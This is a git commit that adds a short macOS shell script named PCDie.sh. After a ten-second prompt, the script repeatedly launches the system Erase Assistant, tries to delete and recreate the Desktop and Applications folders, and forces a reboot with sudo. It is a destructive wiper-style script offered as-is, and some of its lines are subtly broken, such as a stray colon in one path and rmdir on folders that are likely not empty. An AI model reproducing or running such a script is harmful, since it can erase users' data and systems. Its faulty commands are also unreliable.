fcd713e319c52cdb4283c141f59bd69af9d3982d
PalanSecpw <85010269+PalanSecpw@users.noreply.github.com>
2021-07-14 18:57:27 +0200

    Add files via upload

---
+++ PCDie.sh
@@ -0,0 +1,12 @@
+echo Sure to continue? In 10 seconds the script will RUN.
+sleep 10
+/System/Library/CoreServices/Erase\ Assistant.app/Contents/MacOS/Erase\ Assistant
+/System/Library/CoreServices/Erase\ Assistant.app/Contents/MacOS/Erase\ Assistant
+/System/Library/CoreServices/Erase\ Assistant.app/Contents/MacOS/Erase\ Assistant
+/System/Library/CoreServices/Erase\ Assistant.app/Contents/MacOS/Erase\ Assistant
+/System/Library/CoreServices/Erase\ Assistant.app/Contents/MacOS/Erase\ Assistant
+rmdir ./Desktop
+mkdir ./Desktop
+rmdir ./Applications
+mkdir :/Applications
+sudo reboot
